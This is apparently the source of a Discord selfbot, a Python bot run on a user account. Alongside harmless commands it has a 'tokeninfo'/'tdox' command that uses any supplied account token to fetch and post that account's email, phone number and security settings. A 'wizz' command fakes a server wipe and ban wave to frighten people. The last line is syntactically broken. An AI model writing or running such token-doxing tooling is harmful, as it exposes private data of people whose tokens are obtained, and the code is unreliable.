@client.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@client.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@client.command()
async def everyone(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')


@client.command(aliases=["reversesearch", "anticatfish", "catfish"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(
            description=
            f"https://images.google.com/searchbyimage?image_url={user.avatar_url}"
        )
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)

@client.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)

@client.command(
    name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
async def _get_color(ctx, *, color: discord.Colour):
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'{str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)

@client.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("Done lol")
        initial = random.randrange(0, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`"
        )
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
        )
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`"
        )

@client.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))

@client.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(
                user.mention, file=discord.File(file, f"venge_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@client.command()
async def stop(ctx):
    await ctx.message.delete()
    print("Selfbot Stopping")
    print("Stopping Bot!")
    time.sleep(1)
    print("Time Left: 10")
    time.sleep(1)
    print("Time Left: 9")
    time.sleep(1)
    print("Time Left: 8")
    time.sleep(1)
    print("Time Left: 7")
    time.sleep(1)
    print("Time Left: 6")
    time.sleep(1)
    print("Time Left: 5")
    time.sleep(1)
    print("Time Left: 4")
    time.sleep(1)
    print("Time Left: 3")
    time.sleep(1)
    print("Time Left: 2")
    time.sleep(1)
    print("Time Left: 1")
    time.sleep(1)
    print("Shutting Down! - Created By $yn#0001")
    await client.logout()

    os.system("clear")
   

@client.command()
async def mytoken(ctx):
    await ctx.message.delete()
    print("your token is",token)
    



token = "YOUR TOKEn"

client.run("YOUR TOKEN, bot=False)
